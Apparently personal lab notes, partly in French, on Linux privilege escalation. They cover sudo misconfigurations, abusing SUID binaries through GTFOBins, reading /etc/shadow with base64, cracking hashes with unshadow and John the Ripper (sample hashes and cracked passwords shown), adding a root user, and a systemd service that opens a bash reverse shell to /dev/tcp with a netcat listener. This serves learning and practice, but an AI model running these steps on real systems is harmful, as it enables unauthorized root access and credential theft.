
## __Sudo -l__

Grâce à la commande **`sudo -l`**, on peut récuperer les commandes que l'on peut éxecuter en sudo.

```shell
$ sudo -l
Matching Defaults entries for karen on ip-10-10-127-120:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-127-120:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

Ici on peut voir que l'utilisateur peut utiliser nano en sudoer.

On peut voir sur **[gtfobins](https://gtfobins.github.io/gtfobins/nano/)** qu'on peut effectuer une **élévation des privilèges** avec **Nano** en executant **`/bin/sh`** en **SPELL** mode. 

```shell
./nano -s /bin/sh
/bin/sh
^T
```

On peut ensuite voir qu'on passe en root.
# SUID
Much of linux priviledge controls rely on controlling the users and files interactions.
We do this with the permission, you have read write execute.
They are given by the creator of the file.
This change with **SUID** (Set-user Identification) and **SGID** (Set-group Identification).
These **allow files to be executed with the permission level of the file owner** or the group owner, respectively.

These files have an “s” bit set.
![[Pasted image 20241226095837.png]]
To find these file you can do this command:
```shell
find / -type f -perm -04000 -ls 2>/dev/null
```

This link https://gtfobins.github.io/#+suid show you the executable known to be exploitable with the SUID bit set.
## Base64
Here for exemple, we have the base64 executable.  
https://gtfobins.github.io/gtfobins/base64/
![[Pasted image 20241226100542.png]]
### Check
We need to get the content of the `/etc/passwd` and `/etc/shadow` files
Without base64:
```bash
$ cat $LFILE
cat: /etc/shadow: Permission denied
```

With base64:
```bash
$ LFILE=/etc/shadow
$ base64 "$LFILE" | base64 --decode
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
...
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
```
### Unshadow
Now we will create a crackable file by **John the ripper** with **`Unshadow`**.
```bash
$ unshadow passwd.txt shadow.txt > password.txt
$ cat password.txt

root:*:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
...
lxd:!:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:1003:1003::/home/karen:/bin/sh
```

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext.
#### John the ripper
First, let's get the hash:
```bash
$ grep -v '*\|!' password.txt > hash.txt
$ cat hash.txt

root:x:0:0:root:/root:/bin/bash
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:1001:1001::/home/gerryconway:/bin/sh
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:1002:1002::/home/user2:/bin/sh
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:1003:1003::/home/karen:/bin/sh
```
##### Crack the password
Next you can start the cracking:
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/10-million-password-list-top-1000000.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test123          (gerryconway)
Password1        (karen)
Password1        (user2)
3g 0:00:00:01 DONE (2024-12-26 14:46) 2.013g/s 2748p/s 6872c/s 6872C/s 262626..12345678q
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Now you can see that we get a password for **gerryconway**, it's **test123**.
##### Connect to the user
```bash
$ su gerryconway
Password:
$ whoami
gerryconway
```
### Add root user
We will need the hash value of the password we want the new user to have
![[Pasted image 20241226143043.png]]
And add it to the /etc/passwd
![[Pasted image 20241226143105.png]]Then connect to this user:
![[Pasted image 20241226143130.png]]
## Systemctl
https://gtfobins.github.io/gtfobins/systemctl/
If you don't have the permission to run sudo.
### Create the service
```bash
$ nano root.service
```
And put this code in:
```bash
[unit]  
Description=root  
  
[Service]  
Type=simple  
User=root  
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<you ip>/<you port> 0>&1'  
  
[Install]  
WantedBy=multi-user.target
```
### Setup listener
We can setup the listener with netcat
```bash
$ nc -lvnp <PORT>
Listening on 0.0.0.0 8080
```
### Run the service
First we have to enable the service
```bash
$ systemctl enable /tmp/root.service
```
Then start it
```bash
$ systemctl start root
```
